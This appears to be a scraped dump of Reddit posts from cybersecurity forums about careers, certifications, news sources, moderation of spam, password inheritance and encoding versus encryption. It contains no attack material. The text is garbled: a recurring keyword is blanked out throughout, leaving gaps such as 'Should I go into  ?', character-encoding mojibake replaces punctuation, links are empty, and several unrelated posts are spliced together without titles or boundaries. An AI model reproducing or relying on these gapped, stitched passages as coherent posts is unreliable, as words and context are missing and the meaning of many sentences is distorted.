9,"Fellow Cyber Security Pro's, where do you get your regular feeds of information? Hey fellow cyber pro's!

This might be more of a question for SOC members, but feel free to share. How do you get your feed of up to date information out there in the real world to help keep you ahead and on top of your company or customers defenses? Not specifically the internal systems you may have in place for detection, but more externally. What websites do you fire up or leave open in the background to make sure you don't miss the latest threat information?

92,"How I got an entry-level   role. So I spent a lot of time on security stions and st year and a half as I‚Äôve tried to break into security and I just landed an entry level role as a Security Analyst. I thought I‚Äôd share my story here as I was in the same boat as a lot of you two years ago (no relevant degree/certs, no real IT experience, vague idea of security, lots of discouragement from negative people on forums, etc.) .   





I had a Bachelor‚Äôs degree in philosophy and about 3 years of job experience doing technical writing, operations management, and other roles but I knew that I wanted to go into IT. I decided to apply for a Master‚Äôs in Information Systems Operations Management to get that technical skillset/street cred. Towards the end of my degree I pretty much had my sights set on security. I loved the classes and it just seemed like a badass field ( , secrets, cryptography, etc.) so I decided to dedicate the next year and a half to making myself the ideal candidate for a security position.  



As my first step, I applied for a desktop support role at the university I was studying at and got the job. Here‚Äôs what factored into that:    




-the nature of my degree  

-even though my most recent role was not officially IT related, I helped on a ton of IT projects and pushed that as much as I could in the interview  

-tried to push the fact that even though I did not have an extremely intensive IT background, I had a lot of customer service/people skills which is invaluable in a desktop support environment when dealing with difficult situations/people  

-researched desktop support interview questions and just general good interview preparation  
  




(the fact that I was a student in the university which the job was held did not factor into me getting the job so don‚Äôt be discouraged about that. The hiring manager didn‚Äôt know I attended school until my first day of work).   
  



From my literal first day, after meeting anybody with a vaguely IT related role I would ask ‚Äúdo you do anything security related?‚Äù. From there, I got bits and pieces from everybody as time went on and learned about security from an actual IT environment. I cannot overestimate how much this helped my understanding of security. This extra step is what will make the most of your desktop support role.  

  


After a few months on the job, I delved into a bunch of security projects at home. I started watching Security+ cert training videos and built a home lab. I made my own pentesting kit with a small pi kit and made my own personal VPN using Amazon Web Services / Google Cloud platform.  

  


At this point, I just start applying like crazy. DevOps, IT Architect, SysAdmin, Security Analyst etc. I used Linkedin, monster, indeed, my own university, etc. I made sure to have my linkedin profile looking as best as I could, making sure my settings were open to recruiters, adding my skills and hounding my friends to endorse my skills if they had seen me use them in class or on personal projects.  
  



A few months into applying a recruiter contacted me about a Security Analyst role. I learned as much as I possibly could about the company, researched their employees on linkedin, and read every kind of relevant security interview preparation that I could find online. I made it through the rounds and got the offer.   
  



They loved the fact that I had a homelab (you should check out that subreddit by the way, s awesome) and they actually outright asked ‚Äúdo you have a homelab‚Äù which I thought was crazy. It gave me something tangible to talk about and showed that I was clearly interested in security. The homelab was also a great way to learn about basic networking concepts which is ESSENTIAL to security.   
  


Also, all the probing I did at worked helped me talk about my desktop support experience like it was a security job. I‚Äôve found the title doesn‚Äôt matter as much as the experiences you can talk about from that position.  The security+ videos helped a lot too. Even though I never went and got the certification, watching the videos helped me understand basic security and totally helped me get through the interview process. (The best youtube channel to practice for security+ is ‚ÄúProfessor Messer‚Äù. His guides for all IT certs are free, quick, informative, and just all around awesome.)
  
  


So yeah, all of the above took a long time, but definitely worth it. I am by no means an expert in  , but I literally just made small progress every week which really accumulated over a year and a half. I‚Äôm happy to answer any questions and honestly, I‚Äôm just here to say that you can do it too!",1

&amp;#x200B;

So many people on here ask these questions. 

* Where should I Start?
* Should I go into  ?
* Should I major in  ?
* I want to be a hacker, how can I do that?
* And, others

I feel like when I see people saying ""I want to be in  ,"" what they are really saying is ""I want to be a hacker.""

That's fine and all, but   is WAY more than being a hacker, and that's the point of this post.

**My Background**

I am not ""in  "" by education. I am an electrical engineer with over 10 years experience in avionics embedded systems engineering including software, firmware, and unit-&gt;system level testing, to include flight testing. I've enjoyed so much the engineering side of my career, and honestly I miss it sometimes.  At one point, it became apparent that ""we"" weren't ""doing  "", and that it was a a big problem. (Note: I'm keeping details extremely vague on purpose) The most common thought with most of the engineers around me was ""  isn't that big of a deal in our industry,"" and quite frankly I agreed. So when my leadership saw an eager engineer who is always looking for a challenge and willing to self-improve to meet any challenge head on, they volun-told me to get ""cyber smart.""  About a week later I was told I was registered for a Certified Secure Software Lifecycle Professional (CSSLP) bootcamp, and about 2 months later I was certified (Praise the Lord!!! That test was HARD!)

&amp;#x200B;

Anywho, so here I am, a certified Cyber professional with less than 6 months experience ACTUALLY focusing on  . Since then, I went on to get my CISSP (really easy after taking the CSSLP) and being assigned a primary technical   SME position for billions of dollars in assets) yay!

&amp;#x200B;

**My Philosophy on Professional Education**

A little over 25 years ago, the most sought after degrees and profession was Internet Technology (IT). People flocked to this. Yes, that includes programmers, but I'm specifically pointing out those that went into traditional IT (firewalls, AD, etc). While those jobs still exist they have in many ways waned over the years due to increased automation, decreased expenses on personnel, and simple supply/demand. Why pay an IT person with a degree X dollars when I can pay someone with a Security + or A+ Y dollars less?  Right wrong or indifferent that IS the current job market landscape.  

We are poised for this to happen again.   ""degrees"" and ""certifications"" are the new IT degrees and 10-20 years from now, you'll be either searching for a job or pigeon-holed into a career that you cannot advance from. Many of the tools that are being built are automating a lot of the ""Secure,"" ""Detect,"" and eventually ""Protect"" and ""Respond."" And, clearly with the huge national (and international) push for   professionals there will be a LOT of supply.  So, what does that mean? Does that mean a ""  degree"" is useless?  Not at all. Like everything it has its purpose.  I think it is very important to ask yourself ""where do I want to be after 10 years in my career"" not ""what do i want to do for a starting job.""  Understand that programming and "" "" are entry level positions in many ways. If you want to stay there, then you'll want to expect to stay at that wage-level. It isn't all bad news of course, because you can be a SME or an ""lead,"" and if that is what you love, why would you want to do anything else? However, the importance of asking ""where do I want to be after 10 years"" is because a pigeon-holed technical degree may not get you there (though it might).  

&amp;#x200B;

**So what are you really saying?**

While there are a LOT of job openings looking for ""  professionals"" there are many more jobs looking for ""Scientists and Engineers."" And, many more jobs looking for ""MBAs,"" and ""Accountants,"" etc.  ""Wait a minute, this is a   channel!?""  Yes, and the very best   professionals that I've run into in the last 5 years have been those that have vectored from another career path and APPRECIATE the mission, business, technical challenges of implementing   measures.  You see, many IT people whoa re   people understand how to lock down a firewall, but they don't understand how to lock down a CNC laser mill that is used for titanium manufacturing. However, an industrial engineer turned   professional does!  Or, how to apply Security Policies to the (ANCIENT) Windows XP machine running that MRI machine at the hospital, but a medical technical with a Security+ does!

You see, it is the professional education PLUS   philosophies that is needed in the ""REAL"" world, especially in the world of cyber-physical systems.

What about those MBAs or Accountants I mentioned? And MBA or Accountants with   knowledge is going to be able to understand that Incident Response Plan, Continuity Plan, etc and understand why it is important and how it can actually SAVE the company many. Wow...can you imagine a situation where you have a Senior manager, President, or CEO that has a CISSP?! They would have a MUCH better understand of their   group's challenges than one without.

&amp;#x200B;

**Conclusion**

**Please remember that this is just my opinion.** We are still early in the development of the ""  professional"" degrees and course-wares, and potentially they will get very good. If you don't mind being pigeon-holes in your career, then that might be the perfect solution for you. However, if I am a manager at a company, and what I really need is another engineer, but I have GOT to get this   thing figured out, and I see an EE with a CISSP/CSSLP/Secure+/ETC, then that person just hit the top of my list.  If I'm a MBA with a CISSP, I have a very good chance of getting promoted because I have a better understand of the cyber challenges to the company.

In my line of work, we have a statement ""  is everyone's job"".  Well if you believe that, then no matter what career path you are in, I recommend investing in a Security+ and eventually a CISSP, because you will DRAMATICALLY increase your value to your company.

170,"""We're listening"" - The next phase of rebuilding security All, 

Wow! The feedback we‚Äôve received since the ‚Äúgreat toilet flush‚Äù last weekend has been great. Everything from the suggestions about where the subreddit should focus, to the astronomical (and rightfully placed) number of complaints about the strict Auto-Moderator rules, has been brought to our attention either in [our former announcement thread](  or in mod-mail. We continue to encourage honest, good faith, discourse. Here‚Äôs some updates:

* **Auto-Moderator:** The rules that were established last weekend are still in play, but they‚Äôre a bit more honed for their intended targets now. For instance, a *post* (self-post or link submission) now requires 90 days account history where as comments do not. On the flip side of that coin, *comments* require &gt;= 20 karma but have no account age requirements. This is still less than ideal, and will still catch well-meaning members to be targeted by the Auto-Moderator. What make‚Äôs this different than last week‚Äôs mentality of ‚Äúcollateral damage‚Äù is that now there is a white-list mechanism in place. If anyone gets caught in the cross hair of Auto-Moderator‚Äôs remove button, message the mods and we‚Äôll review your account and your submission and add you to the whitelist.

* **Subreddit Focus:** We‚Äôve heard you and all that remains on determining the focus of the new security is our own internal deliberation. The security mod team (u/chumstick, u/CDSEChris, u/Spncrgmn, and u/danielrm26) need to hash out our ideas, and our reservations, about the different directions the sub can be taken. Not just about content, but about the reality of keeping on track with the mission. I suspect that we should have some sort of idea/plan ready in short-order. Of course, we‚Äôll keep you all updated on progress and new developments along the way. 

Keep the feedback coming! To paraphrase a certain renowned doctor from Seattle: *We‚Äôre listening.*

238,"6 Reasons Why You Should NOT Work In Information Security  

*This article does not mean to be demeaning to the career I chose to follow, but rather a humorous rundown of facts about being a security professional that cannot be ignored, and are shared amongst several of us. Do not let the items below discourage you, but rather be aware that they are an intrinsic as part of the journey!* *üì∑*

### 6 ‚Äì Working long hours, forever

Please raise your hands those of you who go home 100% sure that no one will be able to break onto the network/security domain you manage. If you are one of those, either you are just starting in the career and was not around during the good old Sasser‚Äôs days, or you just disconnected the computer from the power plug. Things break. Things break even when we don‚Äôt touch them. That‚Äôs a natural fact of life. Now imagine someone/something¬† having the whole eternity to saw off the bar cells. One day they will succeed, and that‚Äôs pretty much the life of a security professional. You have limited amount of time/budget to fix things, and people out there have all the time (and some times resources too) to break it‚Ä¶ it is an unfair competition‚Ä¶ And that‚Äôs just the beginning.

As a friend of mine says, after some¬†time you get used to sleeping with an eye opened‚Ä¶¬†But it is fun!

### 5 ‚Äì People only remember of you when things go wrong

I am still trying to recall the last time my boss came to me out of the blue and said: Adriano, congratulations for how secure our network is. I‚Äôm giving you a¬†nice bonus¬†for that! Actually, I think it never happened.

Whilst I see the marketing department or Jack from the sales department getting promoted and acclaimed for their feats (free trips to Hawaii all included, etc.), I strive to do an excellent job but¬†very few¬†ever gave me a¬†humble thanks.¬†I believe my Networks friends are on the same boat, right? You have to realise that you are, and will always be a cost center when compared to the bon vivants on sales. Sorry, it‚Äôs never going to change (you can learn some vital lessons to survive [here]( 

Now, imagine that after all the work and effort you put to patch and remediate the vulnerabilities of your network, an evil spirited kid in Russia discovers a zero day patch that can disrupt your network (and millions others). Guess what‚Äôs going to happen! I remember once (a couple of years ago) when our network got infected with some nasty bug, I had at a time my boss (the manager), the CISO and ¬†the CIO literally breathing on my neck, sitting behind me and watching¬†while I cleaned up our Exchange server. Every 2 minutes one of them asked: -How is it going, how long is it going to take?

It was a nerve wrecking experience, but I survived! Has it happened to you before?  


### 4 ‚Äì Study, study and more study

It is sad. Again, whilst Jack is entertaining the customers¬†at the best restaurant in town, we poor security professionals are stuck on the bus, going home and reading the latest news on AWS Security. ¬†Or better, he might be taking a high profile customer to a golf relaxation session¬†whilst we try to clean up their malware infected desktops or decide what [Information Security certification ](  get next. I believe our day will come some day‚Ä¶

### 3 ‚Äì There is a limit for growth to your career

You are smart. You know how to facilitate business whilst keeping it secure. You have good relationship with all layers above and below you. You even have a blog about security, with thousands of followers. What are your chances of becoming the CEO ofthe company you work for? Perhaps as¬†likely as having your security blog becoming as popular as Facebook.¬†Anyways, there are still some ways to [go up the ladder as¬†an Information Security Professional](   
Now, let‚Äôs ask our CEO what sort of background he has: ‚Äì Well, I started as a temp, and soon after that got a job as a salesman and‚Ä¶ No. You kidding right? You spent your whole life having lunch for free, and now you tell me you are the captain of the boat? It can‚Äôt be real‚Ä¶

### 2 ‚Äì No room for mistakes

Let‚Äôs imagine the following scenario: you manage to maintain your environment incident free for the couple of months until‚Ä¶ until Jack brings that same infected laptop (again?) to your network (-so what? My client was showing me about some funny videos on the internet on a dodgy website!). The network falls into its knees, and now you have to say goodbye to your weekend.

Guess what, Jack is still going on a sail boat trip tomorrow morning.

You won‚Äôt.

### 1 ‚Äì People expect you to¬†crack their exes Gmail passwords, wireless networks, and combination locks.

Tell me, honestly. How many times have your friends approached you asking you to crack their ex-girlfriend/boyfriend e-mail password? How many times did they come to you asking for you to download that nice game without paying a penny? -but you¬† are a hacker, isn‚Äôt it easy for you?

Tht‚Äôs when you try to explain that it can be done, but it‚Äôs not ethical, and‚Ä¶

290,"I Am Looking For Your   Horror Stories Greetings. I have a request for all the   pros out there. I am looking for your horror stories for my podcast, Security In Five. 

Being in the industry for 20 years I know behind the scenes how things really work, the decisions that are made and not made and the reasons why. I also know how most breaches occur from internal failures from negligence, Na√Øvety , or pure ignorance. Now, I am looking for yours.

The stories I am looking for are ones that I can spin into an educational message but also reveal reality. 

Here are some examples of stories -

\- Arguing with the Chief Architecture Officer that internally across 3,000+ databases, active directory and hundreds of internal web applications in a Fortune 100 company has zero SSL deployed. The reason, the CAO said it caused too much overhead on performance and they were behind the firewall.

292,"Certs, Degrees, &amp; Experience: A (hopefully) useful guide to common questions. Hi everyone, this is my first post here so bear with me. I almost never use Reddit to talk about professional matters, but I think this might be useful to some of you.

I'm going to be addressing what seems to be a very common question in this sub - namely, what is more important when seeking employment - a university degree, certifications, or work experience?

First, I'll give a very brief background as to who I am, and why I feel qualified to answer this question. I'm currently the Enterprise Security Architect for a Fortune 400 company - I'm happy to verify this with mods or whatever might be necessary. I got my start working with cyber operations for the US military, and have experience with technical responsibilities such as penetration testing, server management, networking, programming, etc., as well as personnel management and leadership training. I hold an associate's degree in information technology, as well as numerous certs, from Sec + and CEH to more focused, internal DoD cyber security training. Introductions aside, on to the topic at hand:

Here's the short answer, albeit the obvious one - anything is helpful in getting your foot in the door, but there are more important factors involved.

Now, for the deep dive:

Let's start by addressing the purpose of certs, degrees, and experience, and what they say to a prospective employer about you. A lot of what I say will be obvious to some extent, but I think the background is warranted. 

Certifications exist to let an employer know that a trusted authority (the organization providing the cert) has acknowledged that the cert holder (you) has proven a demonstrable level of knowledge or expertise in a particular area.

An academic degree does much the same - the difference is that, obviously, a degree will generally demonstrate a potentially broader understanding of a number of topics on a deeper level than a cert will - this is dependant on the study topic, the level of degree, etc., but it's generally assumed that a 4-year degree should cover a wider range of topics than a certification, and to a deeper level.

Experience needs no explanation. It denotes skills gained through active, hands-on work in a given field, and should be confirmed through positive references from supervisors, peers, and subordinates.

In general, we can see a pattern here in terms of what a hiring manager or department is looking for - demonstrable skills and knowledge, backed up by confirmation from a trusted third party. So, which of these is most important to someone trying to begin a career in cyber security? Well, that depends on a few factors, which I'll discuss now.

Firstly, what position are you applying for? The importance placed on degrees, certs, and experience, will vary depending on the level of job you're applying to. If it's an entry level admin or analyst role, a degree or a handful of low-level certs will definitely be useful in getting noticed by HR. Going up to the engineering and solution architecture level roles, you'll want a combination of some years of experience under your belt, and either a degree or some low/mid level certs. At a certain point, the degree and certs actually become non-essential, and most companies will base their hiring process almost entirely on the body and quality of your experience over any degree or certifications held for management level roles.

Secondly, what are your soft skills? This is a fourth aspect that we haven't talked about yet, and that I almost never see discussed. I would argue that this is the single most important quality looked at by employers: the level of a candidate's interpersonal skills. No matter how technically skilled someone is, what a company looks for is someone who can explain their value, and fit into a corporate culture. Are you personable? Of good humor? Do people enjoy working with you? Can you explain WHY your degree, certs, or expertise will add value to their corporate mission? Being able to answer these questions in a manner which is inviting and concise will make you much more appealing than your competitors.

At the end of the day, as a hiring manager, I know that I can always send an employee for further training where necessary, and help bolster their technical ability. What I can't do is teach you how to work with a security focused mindset, nor how to interact with co-workers, customers, clients, and the company in a positive and meaningful way, and this skill set is what will set you apart from everyone else.

I realize that this may seem like an unsatisfactory answer, but the reality is that degrees, certs, and experience are all important to some extent, but that none of these factors will make you stand out. Your ability to sell your value, and to maintain a positive working relationship within a corporate culture, will take you much farther than anything else.

I hope this has been at least slightly helpful - if anyone has any questions for me, or would like any advice, feel free to ask in the comments - I'll do my best to reply to everyone.

TL;DR
I wanna get good but feel like a goon and not able to dial into the corporate vibe. 


Been in the new position for over a year now and I really like it. Big company (imo), several thousand people. I can really see that I can do a lot of growing. I enjoy working with other departments (most of the time) and my level of responsibility. I am the only information security analyst in my department. Manager and I report directly to CISO. We meet weekly and discuss duties, tasks, projects, compliance, EVS/IVS findings, up-and-commings of the company. 

BUT...

I can't seem to shake the feeling and thought that I really suck at my job, that I have nothing but technical marbles in my mouth when the CISO asks me a question. What I can say in 40 words, only requires 20 from my manager.

This past year has felt like a process of 3 steps forward and 1 back. But that's still progress. I make less mistakes, catch more, more often, and fix mistakes faster. 

I'm really looking to up my game a lot this year and solidify myself as a dependable professional when it comes to risk, incident response, corporate-level policy and procedure.

390,"Is it getting harder to get into cyber security? I understand that as new technology comes, more opportunity for bug bounties and zero days arise. But I hope to one day discover a zero day and report it. I feel like as technology advances, so is security, and it's getting harder and harder for beginners to reach a level where they can discover bugs and vulnerabilities. For example, how many websites are still vulnerable to sql injections? Am I wrong for thinking it's become common practice to sanitize input? Or does input sometimes still go unfiltered? 

We use a lot of the same technology in a lot of places, such as the same operating systems, the same web applications, etc. Since this is the case, more security is added to the few systems that are used the most, making it harder to find exploits.

Is this true? Anyone have thoughts on this? ",1

571,"  Specialist Interview Hey folks,

I have a   specialist interview in a couple weeks. I've already made it through the first two rounds and now they want to bring me onsite for a more immersive, final interview (I'm pretty junior, BTW). The job role consists of being on a small team that travels around and performs assessments on subsidiary companies of the parent company. Like an in-house third-party assessment team. The questions in the previous interviews have been very high-level, and the job description is non-descript. Job description phrases like:

\- Proficient knowledge of NIST, PCI, SOX and other   standards

\- Broad technical knowledge of all common security domains

\- Expertise in security development and solution engineering, security operations

management, incident management, governance, and solution delivery and life-cycle

management

&amp;#x200B;

The final interview agenda has a section called ""Technical Test."" So, the reason for writing this is to get some insight on what to expect for the technical test. I understand this is a very broad question, but based on the generic job description and questions they have already asked me, I'm at a loss for what I should expect and prepare for. Specific assessment/pen test software? Assessment procedures? 

&amp;#x200B;

Any insight would be appreciated. For instance, if you were in their position, what might you ask me to perform knowing that I would be performing technical and tabletop assessments of multiple subsidiary companies.

  -In my research I‚Äôve seen conflicting reports on the competitiveness of the industry. On one hand that it‚Äôs an industry growing at an extremely fast rate, 28% according to the Department of Labor.

  -This last one is more subjective, but would still appreciate some perspective; In the city I live in there is a good community college with a 4 year cybersec program and there is also a university with a cybersec program.

Just so people know, I love computers and technology, so I wanted a job in a technology field like this. I read all the jobs that are involved in cyber security and I think the analyst was one that I would enjoy. These jobs also give good improvement paths as well as you go on from what I have read. So with all that aside, let me ask these questions that I hope you can answer for me.

* I want to go to college for Computer Science, mostly because I would be interested, but also has a huge field of jobs that I would be open to do under it, is that a good idea?
* From what I have read, I should get a 4 year degree, correct?
* Dose the school name matter at all? I will be going to a university, maybe Illinois State University, but I am open to change if that is not the best option.
* Finally, is there any sort of way that I can practice being a cyber security analyst, or learn to be one right now? Its just that I can not find anything that I can learn or practice on because I want to see if this type of job is for me.

I‚Äôm 39 and have decided to go back to school.
I have a few questions about getting into Cyber Security for those of you who work in the field.

In 2014, I earned a certificate in web design from Art Institute of Pittsburgh and I really enjoyed it. I‚Äôll be going back next month to work towards completing my associate degree (because they‚Äôve offered me a scholarship to do it). 

Then, I‚Äôd like to transfer to different school and get a bachelor degree in Computer Science or Cyber Security.

Doing a little research on here, it seems that Cyber Security is a new niche that some schools are offering but it‚Äôs not necessarily the best way to go about learning it...?

I‚Äôm looking at Oregon State University‚Äôs Computer Science Program:

 

 Or, Bellevue University‚Äôs Cyber Security Cohort  Program:

 

Some say Bellevue Uni is a degree mill but, I haven‚Äôt really found any information to confirm that as they are listed as a National Center of Academic Excellence in Information.

Any advice on choosing an online bachelors degree program would from an accredited school would be greatly appreciated!

On a side note:

Math has always been difficult for me. I‚Äôm more of a creative, self employed type.

How much math is truely used working in Programming and Cyber Security?

Thanks!!

[Today being 3\/19]( 

As a precaution, I've added **api.smartli.pw** and **smartli.pw** to my hosts file so that it will direct to my localhost.

\~\~Edit 3/21/2019\~\~

Since a few people are naturally finding this post.  Let me expand on the previous sentence and why you may want to do so as well.

*localhost* is a reference *this* computer, as in the computer you are currently using. By editing your **hosts** file you will force your computer, any web browser or application running on the computer, to go to [127.0.0.1](  in this case it will search your computer for the website.  Since you don't have anything running there it will come back as a dead url, thereby preventing you from visiting some unknown website to download some unknown file.

773,"Just a Beginnner looking for guidance. I have a serious passion for security. I want to make sure I am doing the right things in order to land a job in Information Security. I have things planned out, but just want to get insight from professionals that can lend some guidance and help lay some foundation as what is worth my time, and what is simply a waste. 

\---------------Quick Run Down on my Background-------------------------------

Currently I'm going in to my 4th year of Professional IT-related work. 

\[Year One(20): Started as a Medical Help-Desk Technician\]

\[Year Two&amp;Three&amp;Four(21/22/23): I moved states and started up at a new company as a Help Desk Tier I, and shortly into my third year became Tier II, now on the tail end of year 3 going into year 4 I have accepted a job as(Please spare me as I am not one for titles) Central Services, my specific duties include: AV deployment/management, monitoring critical alerts from UTMs/SIEM/andd other sec. monitors, BDR deployment, Monitoring, testing, and troubleshooting, and a few other things I have done since beginning this new role.\]

&amp;#x200B;

I am in school at local Junior College, for Computer Science. I take online classes mainly as I don't have much time for school. I work 12PM-9PM which gives me a slight schedule conflict with school, plus, I work almost non-stop always helping with anything/everything\[Sometimes I may not do anything, but may learn something which helps\].

&amp;#x200B;

Hold a MTA certification in Security Fundamentals and will be taking my CySA+ in 3 weeks. Also, have started my OSCP journey\[accepting donations for extensions :) \].

I am a active member on hackthebox, always trying to learn something new through that. 

I am most comfortable in the Python Programming Language. However, I am a true beginner to C. 

\----------------------------------------------------------------------------------------------------

I have laid out a 3 year plan for myself and don't quite no if, I am just wasting time. 

Year One: 

Get more familiar with the following, Deep Learning. The likely hood of this spilling over the full 3 years is likely, I know.: 

\- Linux / Python / Windows\[Servers Specifically\] / Networking



Year Two: 

By this time, I'd like to be doing the following: 

\- Security Projects \[ even if they are small just something I can possibly write out in Python  that does simple things \]    

\- I plan to really sit down and focus on OSCP, and maybe take CTF to the next level to really hone in on those skills.

\- Learn PowerShell at a deeper level.         

\- Start for Bachelor's \[Maybe\]

Year Three: 

This year will be mainly dedicated to C Programming Language, and bug research.

778,"Input wanted! Where do you think security should be headed? (also, updates on the spam situation) What a weekend it's been!

Since Thursday, I have gone through this subreddit's moderation queue and cleaned house. I mean all of it. My method was to do post-by-post, comment by comment review for content going back the last two-ish months. After that, if it was in the queue for any reason, it got nuked. 

5 users banned.
274 comments removed. 
158 posts removed as spam,
1785 posts removed for reasons that weren't spam. 

The time range of the removed content was everything from yesterday back to 2010. I remembered why I didn't do it when I took this sub over. It's done now, though. 

I also spent some time setting up AutoModerator on this sub. As some may know, sometime around Friday night we got put on some kind of shitlist for spam. The automoderator right now is set up pretty strictly and is set to monitor both posts and comments. Right now, we're demanding 90 days of account age with more than 100 positive karma. I've already seen a few people caught in the crosshairs that were legitimately commenting on other posts, and in the short term, I'll continue to keep an eye on the queue and will approve false positives as soon as I can. In addition to the karma/age requirements, we've also blacklisted a ton of domains.

So, we have a clean slate. I nearly started doing other things like setting up CSS and preparing the new-redisgn version of the subreddit, and making a sidebar etc. Then it dawned on me: This sub needs a mission. This is a very crowded space:

* sec
* sknetsec
* sec
* sSecurity
* sistersub, 

* /r/security (which got the same top-down scrubbing treatment this sub got).

&amp;#x200B;

Hey everyone,

Last summer, I worked as a summer IT intern for my university's IT Architecture &amp; Security department and split my time working for both the architecture (drawing network diagrams, making RFP templates) and security teams. It was my first time doing security work **(Using whois to find IP, MAC, using ServiceNow ticketing system, Trend Micro DDI, etc.**) I had a great time and I am now in pursuit of a career in  .

&amp;#x200B;

Long story short, a big oil &amp; gas company (in my area, AB Canada) approached and said a security internship opened up last minute and wanted me to come in for an interview. Because it was a last minute addition, they didn't even have a job description for this position. Assuming it was IT Security (like my last university internship) I agreed to an interview and I had the interview today. But I found out that this job is dealing with **SAP security**, not **IT security.**

&amp;#x200B;

They vaguely told me about the kind of tasks I will be doing, but I still don't have a full detailed list of tasks, so I'm going to request a full job description before I decide to accept their offer. But ya, my question is what is SAP Security like? I've done some research on what an SAP career is like, but I don't think I still fully understand it. I think it's a lucrative field, but what about the job market? Will it be hard to transition to somethin else later in my career?

813,"Can you get into Cyber Security without a college degree? Hello everyone, 

I have been thinking of getting into the Cyber Security career field for a few years now. I was in the Air Force as Security Forces for about 4 years, which gave me very minor knowledge on things like Information Assurance. Before I got out, I was considering cross-training to Cyber Security, which would have required another contract, of course. I decided not to do it and go back to being a civilian. 

I have a little bit of college, I think 32 credits or something like that. I was going to a local community college for an Associates in Mechanical Engineering, and then I wanted to switch to Computer Science, but never completed any courses since then. Honestly, I don't like college very much, and prefer something like a technical/trade school. I'd rather focus my learning on the career I am pursuing, instead of wasting my time taking classes that are unrelated, like literature, nutrition, etc. 

I consider myself to be pretty intelligent, and a quick learner. I am very interested in computers, and I find myself pretty well versed in troubleshooting with Windows. I am known in my office and to my friends as ""the computer guy"" who fixes everyone's computers. I'm not saying I'm an expert, but I have more than a basic knowledge. I do need to learn more about Networking, Linux, and coding, though. 

I currently work in the event industry (DJ, Photo, Video, Lighting, Photobooths, etc). And while it's a fun job and I do enjoy it, I'm not sure if it's the career path for me. My job/hours are very flexible, though, and I could certainly juggle school/self-teaching with work. I currently make about $40,000/yr, net. I'm 26 years old. I can make close to 6 digits in my career field, but the amount of time I have to put into it, especially on the weekends, and the amount of stress in this field (you only have one chance to get things right, and management is very stressful), I just don't think it's worth it. 

With all that being said, is there a way to get into Cyber Security without having a college degree, making a similar salary? Can you just obtain certifications, learn the lingo, and get an entry level position? Is there any sort of technical/trade school that is about as good as a Bachelor's or Associate's when it's comes to getting a job? I see that the Cyber Security field typically pays $60,000-$100,000. 

TL;DR: I'm 26, work in the event industry making $40,000/yr, net. I can do school/self-teaching while holding my job. Can I get into Cyber Security without a college degree by just getting certs/knowledge, making at least a similar salary to start?

Should this kind of request be misplaced here, I beg your pardon and would greatly appreciate pointers to more appropriate subreddits.

As I've stated in the title, I've recently been thinking about safely and reliably relaying any and all login information I have to my wife in case of my death.

A year or so ago, I spent an obscene amount of time renewing all of my passwords so that they might fulfill all the known guidelines. I've come up with a behemoth of a password that basically goes A-B-C, where A and C are sequences of the first letters of each word of a certain song and B is a somewhat encoded reference to the site the login belongs to. This enables me to have different passwords for all accounts while maintaining the ability to memorize them all.

I have *tried* teaching this mechanic to my wife, but except for the ones she uses on a daily basis (e.g. PayPal) she won't remember any.

So what I guess what I'm trying to do is to create a list of sorts that contains all the sites I use as well as login and password.

Now for the tricky part... I obviously don't want to write all those down in plain and just deposit it somewhere (even though I own a safe).
Neither am I comfortable storing the info locally on a computer (e.g. Password manager), as it might fail and become inaccessible.
Using a cloud based service seems the logical choice (especially concerning catastrophes that might destroy my home), but I feel like this would essentialy mean packaging all of my ""super secure"" passwords and reducing them down to a single one.
I've thought about splitting the info into various scraps of paper or something like that, but this leaves the questions of where to store them, how my wife could find them and how to secure them against for example a house fire.

I guess there might not be an ideal solution, but I'd appreciate your ideas or advice.

859,Associates degree in cyber security It‚Äôs Friday. And I‚Äôm sure my post will come off as typical but I need a career change. The money is close to 6 figures and great benefits but it‚Äôs draining. I realized my friends in IT all have associates degrees and ‚Äúcerts‚Äù and are making as much as I do and love their jobs. My city has a small college that offers associates in cyber security. Has anyone here known someone to pull 60-80k from an associates degree in cyber? We don‚Äôt live pay check to paycheck but I‚Äôm wondering how realistic I need to be if I switch careers. I see help desk entry level with Comptia for like $12/hr. Should I expect that?

875,"How to convince management to invest in security training Yesterday(06/05/2019) I posted a question to the LinkedIn community, ‚ÄúHow to convince management to invest in security training?‚Äù. There were so many great comments! I want to thank everyone who contributed to the discussion. For those who do not have time to read all the comments, no worries, I summarized the key takeaways below.

Here is the link to the original post: [ 

Why is upper management pushing back on security awareness training?

* Some perceive the training as ‚Äúunproductive‚Äù time and consider it a loss of profit to the business.
* Some wishfully think they won‚Äôt be attacked.
* The cost of purchasing the training itself is not the major deterrent.

Here are some tips commenters provided to help gain acceptance from your upper management:

* Use stories that are easy to remember and relatable. If you want the buy-in from your CFO, then tell a story about Tom from accounting that inadvertently wired $10,000 to a malicious actor as part of BEC.
* Make it personal ‚Äì Explain how easy it is to hack your home network or social accounts, and how only 5 minutes of training can help you avoid becoming a victim. For example, how hackers are using google ads to promote phishing scams or putting in bogus telephone support numbers for well-known companies. This a difficult one to detect for anyone unless they are aware of the method and know what to look for.
* Make it relatable ‚Äì Use examples of exploits that have already happened in your own organization or similar organizations and what the impact was ‚Äì loss of money, reputation damage, loss of customers, terminations, etc.
* Use simple words‚Ä¶ some executives are not that technical, so even ‚Äúsocial engineering‚Äù may be too complex of a word.
* If you have a low budget then¬†security awareness should be the top priority ‚Äì as it has the highest ROI.
* Show how the organization measures compared to others in the same industry.
* If you need to meet compliance regulations, usually training is one of the mandatory requirements.
* It‚Äôs all about the money ‚Äì use KPI to show potential loss due to untrained employees vs the cost of training.

I will be using this¬†information to create a 1-minute video‚Ä¶ it will be¬†challenging.¬†There is so much to say about this topic.

945,"Encryption vs Encoding : is there a difference? To set the stage for this discussion, I've held for some time that there *is* a difference between encoding and encryption.  
My go-to example is the Enigma machine used in WW2. Messages were *encrypted* by the Enigma machine and then *encoded* in Morse Code to be sent via radio. Anyone that knew Morse Code could recopy the seemingly random characters (and many British so-called [Y-stations](  did just that - which would be exhausting work, mind you.) However, unless you knew the encryption mechanism/format (Enigma, Fairplay, simple shift), you were still in the dark.

Similarly, text *could* be encrypted on an Enigma machine, typed in a letter, and hand delivered. Anyone opening that letter would be able to see the letters but the meaning would still be obscured.

So... ***is*** there a difference between encoding and encrypting?

In the example above, if you don't know Morse Code, it may as well be another layer of encryption. If you encrypt a message on your computer, it's very likely being encoded as unicode or ASCII at some level for storage/display/transmission. But I think we'd all agree that Unicode and ASCII are *not* encryption. But, again, if you don't know (have the lookup table for) Unicode or ASCII, you just end up with a bunch of information (numbers) with no apparent meaning.
  
